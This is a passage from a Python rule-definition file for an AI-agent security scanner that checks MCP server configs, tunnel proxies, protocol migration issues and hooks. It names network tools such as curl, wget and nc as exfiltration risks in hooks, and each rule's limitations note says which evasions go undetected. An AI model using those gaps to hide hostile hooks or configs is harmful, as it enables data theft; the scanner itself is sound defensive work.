        "taken for a setting or a dummy, and not reported, when it is under six "
        "characters, holds a `${...}`, `{{...}}` or `<...>` reference or a "
        "placeholder word (your, change-me, placeholder, redacted, dummy, example, "
        "sample, `_here`, four x's), is under 40 characters and contains test, demo, "
        "password, 1234 or abcd, or sits under a name ending in `_NAME`, `_ID` or "
        "`_TOKENS` or containing `TOKENIZER`; so a short real password "
        "(`DB_PASSWORD=Kq7#v`) and a 32-character hex key that happens to contain "
        "`abcd` pass."
    ),
)

_r(
    "AAK-MCP-004",
    "Excessive number of MCP servers declared",
    "More than 10 MCP servers in a single config. "
    "Large tool surface increases attack surface.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Remove the servers this project does not use until each server map, `mcpServers` "
    "or VS Code's `servers`, lists 10 or fewer. The rule counts each map on its own "
    "and fires above 10.",
    sarif_name="ExcessiveMcpServers",
    cve_references=["CVE-2026-21852"],
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SCOPE-01"],
    limitations=(
        "Counts the entries of one server map (`mcpServers`, or `servers` in VS Code's "
        "`.vscode/mcp.json`) in one config file and fires above 10. Servers split "
        "across files are not added up: six in `.vscode/mcp.json` and six in the "
        "`.mcp.json` beside it, which VS Code's agent host loads together, pass."
    ),
)

_r(
    "AAK-MCP-005",
    "MCP server uses npx/uvx to fetch and execute remote packages",
    "The command uses npx, uvx, bunx, or pnpx which fetches the latest version from "
    "a registry at runtime, vulnerable to typosquatting and dependency confusion.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Install the server ahead of time at a fixed version and point `command` at the "
    "installed program (for example `node` with the path to its entry file), so nothing "
    "is downloaded when the client starts. Pinning a version in `args` (AAK-MCP-007) "
    "lowers the risk but does not clear this rule, which fires on `npx`, `uvx`, `bunx` "
    "or `pnpx` as the command.",
    sarif_name="McpRuntimePackageFetch",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    limitations=(
        "Fires when the first word of `command` is npx, uvx, bunx or pnpx. The same "
        "fetch through another launcher is not matched: `pnpm dlx`, `pipx run`, `cmd "
        "/c npx`, or an absolute path such as `/usr/local/bin/npx`."
    ),
)

_r(
    "AAK-MCP-006",
    "MCP server command uses relative path",
    "The command uses a relative path that can be hijacked via PATH manipulation.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Use absolute paths for MCP server executables.",
    sarif_name="McpCommandRelativePath",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-02"],
    limitations=(
        "Fires on a `command` that is not an absolute path, except for a fixed list of "
        "common launchers (node, python, python3, npx, uvx, bunx, pnpx, docker, deno, "
        "bun, cargo, go, java, ruby). Those are resolved through PATH in the same way "
        "and are never reported."
    ),
)

_r(
    "AAK-MCP-007",
    "MCP server lacks version pinning in args",
    "Package name in args lacks @version suffix when using npx/uvx. "
    "Unpinned packages can silently update to malicious versions. "
    "Not reported for a launch AAK-SUPPLY-001 reports in the same scan.",
    Severity.LOW,
    Category.MCP_CONFIG,
    "Pin with @x.y.z suffix, e.g., @modelcontextprotocol/server-filesystem@2025.1.1",
    sarif_name="McpUnpinnedPackageVersion",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-02"],
    limitations=(
        "Looks for a package argument after npx, uvx, bunx or pnpx that has no "
        "`@version` suffix. Any suffix counts as a pin, including the floating tag "
        "`@latest`. The same package fetched through `cmd /c npx` is not checked."
    ),
)

_r(
    "AAK-MCP-008",
    "MCP server headersHelper executes arbitrary commands",
    "The headersHelper field executes arbitrary shell commands to generate headers. "
    "A malicious repo can exfiltrate data via header generation.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Avoid headersHelper in project-scoped configs. Use static headers or OAuth flows instead.",
    sarif_name="McpHeadersHelperShellExec",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-03"],
    limitations=(
        "Reads the `headersHelper` field of servers under `mcpServers` (or `servers`) "
        "in `.mcp.json`, `.cursor/mcp.json`, `.continue/config.json`, "
        "`.gemini/settings.json` and "
        "other `*mcp*.json` files. Servers declared inline in a Claude Code plugin "
        "manifest (`.claude-plugin/plugin.json`) are not read."
    ),
)

_r(
    "AAK-MCP-009",
    "MCP server URL contains an internal network address",
    "The MCP server URL contains a private-range address (10.x, 172.16-31.x, "
    "192.168.x), a `.local` name, or a loopback address (localhost, 127.0.0.1, "
    "0.0.0.0, ::1) somewhere other than its own host, such as a proxy target in "
    "the query, which may expose internal services (SSRF pattern). A server whose "
    "own host is loopback is not reported.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Confirm you run and trust the server at that address. If it should not be there, "
    "remove the entry or point `url` at the intended public HTTPS endpoint. If it is "
    "deliberate (a dev server on your LAN or a sidecar), accept it by listing "
    "`AAK-MCP-009` under `exclude-rules` in `.agent-audit-kit.yml`, with a comment "
    "saying why. The rule matches RFC 1918 private addresses, `.local` hosts, and a "
    "loopback address anywhere in the URL except its own host.",
    sarif_name="McpLocalhostInternalUrl",
    owasp_mcp_references=["MCP09:2025"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Looks in the server `url` for the 10.x, 172.16-31.x and 192.168.x ranges, a "
        "`.local` name, or the text localhost, 127.0.0.1, 0.0.0.0 or ::1; a URL whose "
        "own host is loopback (localhost, 127.0.0.0/8, ::1 or 0.0.0.0) is not "
        "reported. Other internal addresses are not matched: a name such as "
        "`mcp.corp.internal` or the shared range 100.64.0.0/10."
    ),
)

_r(
    "AAK-MCP-010",
    "MCP server config allows arbitrary filesystem root access",
    "An MCP server is configured with filesystem root (/) or home directory access, "
    "allowing unrestricted file operations.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Restrict filesystem access to specific project directories only.",
    sarif_name="McpFilesystemRootAccess",
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SCOPE-02"],
    limitations=(
        "Fires when an argument is exactly `/`, `~`, `/home`, `/Users`, `/etc` or "
        "`/var`. A home directory written as a specific path (`/Users/alice`), as `~/` "
        "or as `${HOME}` is not matched."
    ),
)

_r(
    "AAK-MCP-ATTEST-001",
    "MCP server admitted without attestation",
    "An MCP server entry in the agent/host config is dispatched without any of: a referenced "
    "signed clearance assertion, a `/.well-known/mcp-clearance` (or configured) URI, or a "
    "pinned trust root. Deny-by-default server admission is unenforced, so the server's "
    "self-declared tool list is implicitly trusted at dispatch time.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Add an `attestation` (or `clearance`) field on the server entry pointing to a signed "
    "clearance document, expose it at `/.well-known/mcp-clearance`, and pin a `trust_root` "
    "in the host config that the host verifies before any tool dispatch. See Metere 2026, "
    "arXiv:2605.24248 — wire format, verification algorithm, and RFC-2119 conformance vectors.",
    sarif_name="McpServerUnattested",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    incident_references=["arXiv:2605.24248"],
    limitations=(
        "Fires on an entry of `mcpServers` (or `servers` in VS Code's "
        "`.vscode/mcp.json`) with a `command` or `url` that has none of 13 "
        "attestation keys (`attestation`, `clearance`, `clearance_url`, "
        "`clearance_uri`, `clearance_document`, `clearancedocument`, `mcp_clearance`, "
        "`wellknown_clearance`, `well_known_clearance`, `trust_root`, `trustroot`, "
        "`trust_anchor`, `pinned_trust_root`; any case, `-` for `_`) and no header "
        "named like `MCP-Clearance` or `MCP-Attestation`. A key only has to exist: "
        "`\"attestation\": \"\"` satisfies it, a top-level `trust_root` key silences "
        "every server in the file, and so does the text `.well-known/mcp-clearance` "
        "anywhere in the file; no clearance document or trust root is ever checked."
    ),
)

# ---------------------------------------------------------------------------
# Anthropic MCP Tunnels (research preview, launched 2026-05-19)
# Docs: https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/{overview,reference,security}
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-TUNNEL-001",
    "MCP Tunnels proxy: SSRF defense disabled or bypassed",
    "An MCP Tunnels gateway-proxy config (`/etc/mcp-gateway/config.yaml` or "
    "the Helm `gateway.config.*` ConfigMap) either sets "
    "`upstream.disable_ip_validation: true` or names an `upstream.allowed_ips` "
    "CIDR that covers the public internet (0.0.0.0/0, ::/0, or a /0–/7 IPv4 "
    "prefix). The reference page calls `upstream.allowed_ips` the proxy's "
    "primary SSRF defense; disabling it lets a malicious upstream-side process "
    "reach arbitrary hosts the proxy can route to.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Set `upstream.allowed_ips` to the smallest CIDR ranges that cover your "
    "MCP servers (the reference's default is the RFC1918 private space). "
    "Remove `disable_ip_validation: true`. See "
    "https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/security "
    "(`Restrict upstream.allowed_ips`).",
    sarif_name="McpTunnelSsrfDefenseDisabled",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    incident_references=[
        "Anthropic MCP Tunnels 2026-05-19",
        "platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/reference",
    ],
    limitations=(
        "Fires on `upstream.disable_ip_validation: true`, or an `upstream.allowed_ips` "
        "entry that is `0.0.0.0/0` or `::/0` or has an IPv4 prefix of /7 or shorter or "
        "an IPv6 prefix of /31 or shorter, in a YAML document with `tunnel_domain` and "
        "`routes` at the top (or under `gateway.config`); every document of a "
        "multi-document file is read. Only a file named config, proxy or values "
        "(.yaml or .yml), or one under a directory named tunnel, gateway, mcp-tunnel, "
        "mcp-tunnels, mcp-gateway, mcp_tunnel or mcp_gateway, is read, so the same "
        "settings embedded as a string in a Kubernetes ConfigMap's `data:`, or set in "
        "a document with no `tunnel_domain` and `routes` of its own (an override "
        "layered onto another document), are not seen."
    ),
)

_r(
    "AAK-MCP-TUNNEL-002",
    "MCP Tunnels proxy: HTTPS upstream without trust anchor",
    "An MCP Tunnels gateway-proxy config declares one or more `https://` "
    "upstreams under `routes:` but sets neither `upstream.tls.ca_file` nor "
    "`upstream.tls.include_system_cas: true`. Quoting the reference: "
    "\"otherwise the proxy has no trust anchor for the upstream certificate.\" "
    "Without a trust anchor the proxy will fail closed at best or accept a "
    "man-in-the-middle's certificate at worst, depending on the proxy build.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Add `upstream.tls.ca_file: <path>` pointing at a CA bundle that issued "
    "the upstream certificates, OR set "
    "`upstream.tls.include_system_cas: true` to trust the system CA bundle. "
    "See https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/reference#proxy-configuration.",
    sarif_name="McpTunnelUpstreamNoTrustAnchor",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI07"],
    incident_references=[
        "Anthropic MCP Tunnels 2026-05-19",
        "platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/reference",
    ],
    limitations=(
        "Fires on an `https://` route in a proxy config (a YAML file with "
        "`tunnel_domain` and `routes`) when neither `upstream.tls.ca_file` nor "
        "`upstream.tls.include_system_cas` is set. Only a file named config, proxy or "
        "values (.yaml or .yml), or one under a directory named tunnel, gateway, "
        "mcp-tunnel, mcp-tunnels, mcp-gateway, mcp_tunnel or mcp_gateway, is read, so "
        "the same configuration saved as `deploy/proxy-prod.yaml` is not."
    ),
)

_r(
    "AAK-MCP-TUNNEL-003",
    "MCP Tunnels: tunnel credentials hardcoded in repo / CI",
    "A tunnel token or server TLS private key is checked into the repository "
    "or pinned as a literal value in a CI workflow. Per the MCP Tunnels "
    "overview, \"if an attacker obtains your tunnel token AND one of your "
    "TLS private keys, they could impersonate your proxy and read MCP "
    "request payloads — treat both as high-value secrets.\" Triggers on "
    "literal tunnel-token env vars in CI, PEM private keys committed under "
    "MCP-Tunnels paths, and Kubernetes Secret manifests named "
    "`mcp-tunnel` / `mcp-tunnel-token` / `mcp-tunnel-cert` carrying inline "
    "`data:` values.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Move tunnel tokens and server-cert material into a secrets manager "
    "(GitHub Actions secrets, Vault, sealed-secrets, External Secrets "
    "Operator, vault-secrets-operator). For the setup CLI, use Workload "
    "Identity Federation (`ANTHROPIC_IDENTITY_TOKEN_FILE`) instead of a "
    "literal token. See "
    "https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/security "
    "(`Protect credentials at rest`, `Rotate credentials`).",
    sarif_name="McpTunnelCredentialHardcoded",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    incident_references=[
        "Anthropic MCP Tunnels 2026-05-19",
        "platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/overview",
        "platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/security",
    ],
    limitations=(
        "Looks for a literal value for one of a fixed set of token names "
        "(`MCP_TUNNEL_TOKEN`, `TUNNEL_TOKEN`, `ANTHROPIC_IDENTITY_TOKEN` and two more) "
        "on a `KEY: value` line of a GitHub Actions, GitLab CI, Azure Pipelines or "
        "CircleCI file, for a PEM private key in a file under a tunnel or gateway "
        "directory, and for a Kubernetes Secret named exactly `mcp-tunnel`, "
        "`mcp-tunnel-token` or `mcp-tunnel-cert`. The same token in a "
        "`docker-compose.yml`, or in a Secret with any other name, is not examined."
    ),
)

_r(
    "AAK-MCP-SAMPLING-001",
    "MCP `sampling` capability declared without consent / elicitation guard",
    "An MCP server or client participates in the `sampling` capability (the "
    "server can request LLM completions through the client) without an "
    "accompanying elicitation/consent gate, human-approval flag, or "
    "documented risk acceptance. Sampling output must be treated as untrusted "
    "tool input — without a guard, a compromised or adversarial server can "
    "silently steer the client's LLM (and any tool calls it triggers).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Require an elicitation/createMessage consent prompt before honoring "
    "sampling requests, and treat sampling output as untrusted tool input "
    "(re-run the same sanitization you apply to user input). If sampling is "
    "intentional, accept the risk in `.agent-audit-kit.yml` with "
    "`accepts_sampling_risk: true` and a non-empty `justification:`.",
    sarif_name="McpSamplingNoConsent",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI01", "ASI09"],
    adversa_references=["ADV-AUTH-02"],
    limitations=(
        "Reads .py, .ts, .tsx, .js, .mjs, .cjs, .java, .kt and .rs files of a project "
        "whose root manifest names an MCP SDK in a form AAK-MCP-STATELESS-001 "
        "recognises, for a `capabilities: { ... }` literal that names sampling before "
        "its first closing brace, `ServerCapabilities(` with `sampling=` before its "
        "first `)`, `SamplingCapability(`, `CreateMessageRequestSchema`, "
        "`sampling/createMessage`, `create_message(`, `.sampling.create(` or "
        "`RequestSampling`. One consent marker in any of those files (`elicit(`, "
        "`elicit_create(`, `elicit_input(`, `elicitation(`, `elicitation/create`, "
        "`ElicitRequestSchema`, `ElicitInput`, `requires_consent`, `require_consent`, "
        "`user_consent`, `human_in_the_loop`, `human-in-the-loop` or `humanintheloop` "
        "in any case, `confirmSampling`, `approveSampling`, `samplingConsent` or "
        "`human_approval`) clears every one of those findings, whatever it guards."
    ),
)

# ---------------------------------------------------------------------------
# AAK-MCP-STATELESS-001..004 — 2026-07-28 stateless-MCP migration
#
# The ratified MCP 2026-07-28 spec makes the protocol stateless by
# default: the `Mcp-Session-Id` header and the protocol-level session are
# removed and replaced with explicit, server-minted state handles (SEP-2567),
# while making the mandatory initialization handshake optional so stateless is
# the default (SEP-1442 / SEP-2575). The experimental Tasks primitive (SEP-1686)
# — including `tasks/list` — is moved out of the core spec into the Extensions
# framework (redesigned as SEP-2663), so core `tasks/list` is removed. Server/
# client code that assumes the pre-RC stateful protocol — relies on
# `Mcp-Session-Id`, dispatches `tasks/list`, requires sticky routing or a shared
# session store, or skips client-side caching of `tools/list` while holding
# per-session server state — will silently break after 2026-07-28 once the final
# spec lands. These four rules surface the migration surface so it can be fixed
# before the cutover.
#
# Sources:
#   https://modelcontextprotocol.io/specification/2026-07-28/changelog
#   https://modelcontextprotocol.io/seps/2567-sessionless-mcp
#   https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1442
#   https://github.com/modelcontextprotocol/modelcontextprotocol/pull/2575
#   https://modelcontextprotocol.io/community/seps/1686-tasks
#   https://github.com/modelcontextprotocol/modelcontextprotocol/pull/2663
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-STATELESS-001",
    "Reliance on `Mcp-Session-Id` header / protocol-level session id",
    "Server or client code reads, writes, asserts, or constants the "
    "`Mcp-Session-Id` header. The ratified MCP 2026-07-28 spec "
    "removes the `Mcp-Session-Id` header and the protocol-level session, "
    "replacing them with explicit server-minted state handles (SEP-2567); "
    "SEP-1442 / SEP-2575 make the initialization handshake optional so "
    "stateless is the default. After "
    "the final spec lands on 2026-07-28, code that depends on this header "
    "(or on the session it represented) will silently break: any MCP "
    "request can land on any server instance, and sticky routing / shared "
    "session stores at the protocol layer are no longer guaranteed.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Migrate to the 2026-07-28 stateless transport: route on the "
    "`Mcp-Method` header instead of `Mcp-Session-Id`, drop the "
    "per-connection session id, and treat each request as independently "
    "addressable. If per-server state is genuinely required, persist it "
    "behind an out-of-band identity (auth subject, OAuth `sub`, tool "
    "argument) rather than the removed session header.",
    sarif_name="McpSessionIdReliance",
    limitations=(
        "Runs only when a manifest at the project root names an MCP SDK: `mcp`, "
        "`modelcontextprotocol` or `model-context-protocol` as a dependency in "
        "`pyproject.toml` (`[project]` and optional dependencies, "
        "`[dependency-groups]`, Poetry, uv or PDM) or on a `requirements*.txt` line, "
        "an `@modelcontextprotocol/sdk`, `@anthropic-ai/mcp` or "
        "`@anthropic-ai/claude-agent-sdk` dependency in `package.json`, "
        "`io.modelcontextprotocol` in a Maven or Gradle build, or an `mcp` or "
        "`modelcontextprotocol` line in `Cargo.toml`. A framework that wraps the SDK "
        "(`fastmcp`), the Rust SDK crate `rmcp`, a dependency declared only in "
        "`setup.py`, and a manifest in a subdirectory (`svc/package.json`) do not "
        "count. When it runs, it looks in source files for the header text "
        "`Mcp-Session-Id` (any case) or the constant `MCP_SESSION_ID`."
    ),
)

_r(
    "AAK-MCP-STATELESS-002",
    "Use of removed `tasks/list` method",
    "Server or client code dispatches, handles, or names the `tasks/list` "
    "JSON-RPC method. The ratified MCP 2026-07-28 spec removes "
    "`tasks/list` from the core because it cannot be scoped safely without "
    "the protocol-level session: the experimental Tasks primitive (SEP-1686) "
    "moves out of the core specification into the Extensions framework "
    "(redesigned as SEP-2663), and the stateful list surface has no "
    "stateless successor in core.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Stop calling and handling `tasks/list`. If your application needs an "
    "enumeration of in-flight work, model it as an extension primitive "
    "scoped to an authenticated identity, or store task identifiers "
    "client-side and re-query them with `tasks/get` style point lookups.",
    sarif_name="McpTasksListRemoved",
    owasp_mcp_references=["MCP10:2025"],
    limitations=(
        "Reads source files only in a project whose root manifest names an MCP SDK in "
        "a form AAK-MCP-STATELESS-001 recognises, and matches the quoted method name "
        "`tasks/list` and calls spelled `tasks.list(` or `tasks_list(`. An SDK call "
        "named `listTasks()` is not matched."
    ),
)

_r(
    "AAK-MCP-STATELESS-003",
    "Sticky-session / shared-store dependency in MCP deployment",
    "An MCP server's deployment manifest requires sticky routing (nginx "
    "`ip_hash`, Kubernetes `sessionAffinity: ClientIP`, Traefik / ALB "
    "sticky cookies) or its handler code reads a shared session store "
    "keyed by a per-connection id used across requests. The 2026-07-28 "
    "stateless transport guarantees that any MCP request can land on any "
    "server instance — sticky routing and gateway deep-packet-inspection "
    "to keep a client pinned to one pod stop being safe assumptions.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Remove sticky-session affinity from the gateway and Kubernetes "
    "service. Move per-request state into an external store keyed on an "
    "out-of-band identity (auth subject) rather than a per-connection "
    "session id. Re-test horizontal scaling without affinity before the "
    "2026-07-28 cutover.",
    sarif_name="McpStickySessionDependency",
    limitations=(
        "Looks for nginx `ip_hash;` or `sticky cookie|route|learn`, Kubernetes "
        "`sessionAffinity: ClientIP`, `stickiness.enabled = true` and a Traefik "
        "`sticky:` cookie block in .yaml, .yml, .conf and .toml files and in Caddyfile "
        "that mention MCP or belong to a project that declares an MCP SDK, and, in "
        "such a project, source lookups of `session_store`, `sessions`, "
        "`state_by_session` or `per_session_state` indexed by `session_id`, `sid` or "
        "`mcp_session_id`. Pinning clients some other way, such as nginx `hash "
        "$http_mcp_session_id consistent;`, is not matched."
    ),
)

_r(
    "AAK-MCP-STATELESS-004",
    "MCP client never caches `tools/list` and depends on per-session state",
    "Client code calls `tools/list` (or the SDK alias `list_tools`) inside "
    "a hot path / per-request loop with no caching marker (no `lru_cache`, "
    "TTL cache, dict memoization, or `cached_*` helper) nearby. Combined "
    "with reliance on per-session server state, this pattern multiplies "
    "round-trips and breaks when the 2026-07-28 stateless transport lets "
    "successive requests hit different server instances with different "
    "tool catalogs.",
    Severity.LOW,
    Category.MCP_CONFIG,
    "Cache the `tools/list` response client-side with an explicit TTL "
    "(`ttlMs`) and refresh it on cache miss or on a server-pushed "
    "`notifications/tools/list_changed`. Treat tool discovery as a hint "
    "that may differ between instances under the stateless transport.",
    sarif_name="McpClientNoToolsListCache",
    limitations=(
        "Reads source files only in a project whose root manifest names an MCP SDK in "
        "a form AAK-MCP-STATELESS-001 recognises. It fires on a file that calls "
        "`tools/list` (or `list_tools(`, `.tools.list(`) at least twice, mentions "
        "`session_id` or the session header, and contains none of `lru_cache`, "
        "`cached_property`, `cachetools`, `TTLCache`, `ttlMs`, `ttl_ms`, `ttlSeconds`, "
        "`ttl_seconds`, `tools_list_cache`, `cached_tools`, `memoize` or "
        "`functools.cache`. A single `tools/list` call inside a per-request handler is "
        "not counted, and neither are calls made through the TypeScript SDK's "
        "`client.listTools()`."
    ),
)

# ---------------------------------------------------------------------------
# AAK-MCP-DEPRECATED-001..003 — 2026-07-28 deprecated protocol features.
#
# The ratified MCP 2026-07-28 spec is the first to ship a formal
# deprecation policy (SEP-2596): a minimum 12-month window between deprecation
# and removal. Under it, SEP-2577 annotation-deprecates three core features —
# `roots`, `sampling`, and `logging`. They remain functional in every spec
# version published within 12 months of 2026-07-28 (runway to ~mid-2027), but
# they are on the removal path and each has a documented replacement:
#   - roots     -> pass workspace paths as tool parameters / server config.
#   - sampling  -> call the LLM provider API directly from the server.
#   - logging   -> emit to stderr or OpenTelemetry instead of `logging/setLevel`.
# These three rules surface continued use of the deprecated surfaces so authors
# can migrate inside the 12-month window rather than break on removal. Distinct
# from AAK-MCP-SAMPLING-001 (a *consent* guard on sampling) and the
# AAK-MCP-STATELESS-* pack (the session/tasks transport changes of the same RC).
#
# Sources:
#   https://modelcontextprotocol.io/specification/2026-07-28/changelog
#   https://modelcontextprotocol.io/seps/2577  (deprecate roots/sampling/logging)
#   https://modelcontextprotocol.io/seps/2596  (12-month deprecation policy)
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-DEPRECATED-001",
    "Use of deprecated `roots` capability (roots/list)",
    "Server or client code declares or exercises the `roots` capability — "
    "the `roots/list` request, the `notifications/roots/list_changed` "
    "notification, or the SDK aliases (`list_roots`, `ListRootsRequest`, "
    "`send_roots_list_changed`). The ratified MCP 2026-07-28 spec "
    "deprecates `roots` (SEP-2577) under the new 12-month deprecation policy "
    "(SEP-2596): it stays functional for at least a year but is on the "
    "removal path. Roots leaked the client's workspace layout to every "
    "connected server, which the RC judged an unnecessary standing surface.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Migrate before removal: stop advertising / handling the `roots` "
    "capability and pass the specific workspace paths a tool needs as "
    "explicit tool parameters or server configuration instead. Deprecated "
    "2026-07-28; plan to remove ahead of the ~mid-2027 window.",
    sarif_name="McpDeprecatedRoots",
    owasp_mcp_references=["MCP10:2025"],
    limitations=(
        "In .py, .ts, .tsx, .js, .jsx, .mjs, .cjs, .rs, .java and .kt sources it looks "
        "for `roots/list`, `notifications/roots/list_changed`, `ListRootsRequest`, "
        "`ListRootsResult`, `send_roots_list_changed`, `sendRootsListChanged` and "
        "`RootsListChangedNotification`, and, in a file that also contains "
        "`modelcontextprotocol`, `FastMCP`, `McpServer`, `@mcp.`, `mcp.server`, `from "
        "mcp`, `import mcp` (each as whole words), `ServerCapabilities` or "
        "`mcpServers`, for `list_roots(`, `listRoots(`, `ServerCapabilities(` with "
        "`roots=` before its first `)`, or a `capabilities: { ... }` literal that "
        "names roots before its first closing brace. In JSON, any `capabilities` "
        "object or list that lists roots counts, wherever the key sits, in `.mcp.json` "
        "and any `*.mcp.json` at any depth, and `mcp.json`, "
        "`claude_desktop_config.json`, `package.json` and the per-editor `mcp.json` "
        "files (`.cursor`, `.vscode`, `.windsurf`, `.amazonq`, `.roo`, `.kiro`) "
        "directly under the project root. The same `roots/list` request in a Go file, "
        "and a `capabilities` object in `config/servers.json`, are not read."
    ),
)

_r(
    "AAK-MCP-DEPRECATED-002",
    "Use of deprecated `sampling` capability (sampling/createMessage)",
    "Server or client code declares or exercises the `sampling` capability — "
    "the `sampling/createMessage` request, a `CreateMessageRequest` handler, "
    "or the SDK aliases (`create_message`, `.sampling.create`). The MCP "
    "ratified 2026-07-28 spec deprecates `sampling` (SEP-2577) under "
    "the 12-month deprecation policy (SEP-2596). Server-initiated sampling "
    "made the server a privileged caller of the host LLM and had no clean "
    "stateless story; it is on the removal path. (Distinct from "
    "AAK-MCP-SAMPLING-001, which flags sampling wired up without a consent "
    "gate — this rule flags the deprecated capability itself.)",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Migrate before removal: instead of asking the client to sample via "
    "`sampling/createMessage`, call the LLM provider API directly from the "
    "server with its own credentials. Deprecated 2026-07-28; plan to remove "
    "ahead of the ~mid-2027 window.",
    sarif_name="McpDeprecatedSampling",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI01"],
    limitations=(
        "In .py, .ts, .tsx, .js, .jsx, .mjs, .cjs, .rs, .java and .kt sources it looks "
        "for `sampling/createMessage`, `CreateMessageRequest` (or "
        "`CreateMessageRequestSchema`) and `RequestSampling`, and, in a file that also "
        "contains `modelcontextprotocol`, `FastMCP`, `McpServer`, `@mcp.`, "
        "`mcp.server`, `from mcp`, `import mcp` (each as whole words), "
        "`ServerCapabilities` or `mcpServers`, for `create_message(`, "
        "`.sampling.create(`, `ServerCapabilities(` with `sampling=` before its first "
        "`)`, or a `capabilities: { ... }` literal that names sampling before its "
        "first closing brace. In JSON, any `capabilities` object or list that lists "
        "sampling counts, wherever the key sits, in `.mcp.json` and any `*.mcp.json` "
        "at any depth, and `mcp.json`, `claude_desktop_config.json`, `package.json` "
        "and the per-editor `mcp.json` files (`.cursor`, `.vscode`, `.windsurf`, "
        "`.amazonq`, `.roo`, `.kiro`) directly under the project root. In sources, the "
        "TypeScript SDK call `server.createMessage({...})`, a capabilities literal "
        "with a nested object ahead of `sampling`, and `create_message(` in a file "
        "that names no MCP SDK are not matched; neither is a `capabilities` object in "
        "`config/servers.json`."
    ),
)

_r(
    "AAK-MCP-DEPRECATED-003",
    "Use of deprecated `logging` capability (logging/setLevel)",
    "Server or client code declares or exercises the `logging` capability — "
    "the `logging/setLevel` request, the `notifications/message` log "
    "notification, or the SDK aliases (`set_level`, `SetLevelRequest`, "
    "`LoggingMessageNotification`, `LoggingLevel`). The ratified MCP 2026-07-28 spec "
    "deprecates `logging` (SEP-2577) under the 12-month "
    "deprecation policy (SEP-2596). Protocol-level log-level control was "
    "redundant with host-side observability and is on the removal path.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Migrate before removal: emit logs to stderr or an OpenTelemetry "
    "exporter and control verbosity out-of-band, rather than advertising the "
    "`logging` capability / handling `logging/setLevel`. Deprecated "
    "2026-07-28; plan to remove ahead of the ~mid-2027 window.",
    sarif_name="McpDeprecatedLogging",
    limitations=(
        "In .py, .ts, .tsx, .js, .jsx, .mjs, .cjs, .rs, .java and .kt sources it looks "
        "for `logging/setLevel`, `SetLevelRequest` (or `SetLevelRequestSchema`), "
        "`LoggingMessageNotification` and `LoggingLevel`, and, in a file that also "
        "contains `modelcontextprotocol`, `FastMCP`, `McpServer`, `@mcp.`, "
        "`mcp.server`, `from mcp`, `import mcp` (each as whole words), "
        "`ServerCapabilities` or `mcpServers`, for `ServerCapabilities(` with "
        "`logging=` before its first `)`, or a `capabilities: { ... }` literal that "
        "names logging before its first closing brace. In JSON, any `capabilities` "
        "object or list that lists logging counts, wherever the key sits, in "
        "`.mcp.json` and any `*.mcp.json` at any depth, and `mcp.json`, "
        "`claude_desktop_config.json`, `package.json` and the per-editor `mcp.json` "
        "files (`.cursor`, `.vscode`, `.windsurf`, `.amazonq`, `.roo`, `.kiro`) "
        "directly under the project root. In sources, sending log notifications "
        "through the SDK (`server.sendLoggingMessage({...})`, `await ctx.info(...)`), "
        "a capabilities literal with a nested object ahead of `logging`, and one in a "
        "file that names no MCP SDK are not matched; neither is a `capabilities` "
        "object in `config/servers.json`."
    ),
)

# ---------------------------------------------------------------------------
# Hook Injection Detection (9 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-HOOK-001",
    "Hook executes network-capable command",
    "A hook command contains network-capable tools (curl, wget, nc, etc.). "
    "Hooks run automatically and can exfiltrate code, API keys, or session data.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Remove network calls from hooks. Use file-based logging if audit trail is needed.",
    sarif_name="HookNetworkCapableCommand",
    cve_references=["CVE-2025-59536"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-EXFIL-01"],
    limitations=(
        "Matches curl, wget, nc, ncat, ssh, scp, rsync and ftp by name, and the "
